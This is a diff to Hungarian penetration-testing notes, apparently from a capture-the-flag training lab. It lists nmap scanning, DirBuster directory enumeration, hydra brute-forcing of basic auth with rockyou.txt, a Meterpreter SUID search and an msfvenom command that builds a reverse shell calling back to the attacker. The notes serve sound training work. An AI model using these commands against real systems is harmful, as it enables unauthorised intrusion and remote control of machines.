@@ -330,9 +330,22 @@ ssh -p 1418 (port) student@40.0.2.1 (user@IP)
 METERPRETEEN BELÜL execute -f /bin/bash -i -c "find / -perm -u=s 2>/dev/null"
 
 Videó jegyzet:
+
+KÖNNYŰ GÉP:
 LHOST, RHOST-ot kiírni külön jegyzetbe LHOST: 60.0... RHOST: 40.0... v a másik gép 
 elsőnek sudo nmap -sS -sV ip
 ssh-t soha nem törjük, csak ha van felhasználó:jelszó páros
 80-as port, dirb vagy dirbuster
 ha basic authentication akkor hydra -l admin -P /usr/share/wordlists/rockyou.txt ip http-get target-url (pl /csanad a login felülethez, vagy csak simán /)
+
+HA DIRBUSTER:
+  Dir to start with: /, vagy /csanad, vagy /secret stb.
+  szólista: usr/share/wordlists/dirb/common.txt
+  rekurziót kikapcsolni
+  ha basic authentication, akkor options -> advanced options -> authentication options 
+  /secret
+
+ha valahol tudok kódot futtatni, akkor mondjuk cat, ha tudom hol van a flag
+letöltünk a gépre egy reverse shellt
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=MIIPCÍMÜNK LPORT=4444 -f elf > shell.elf
 
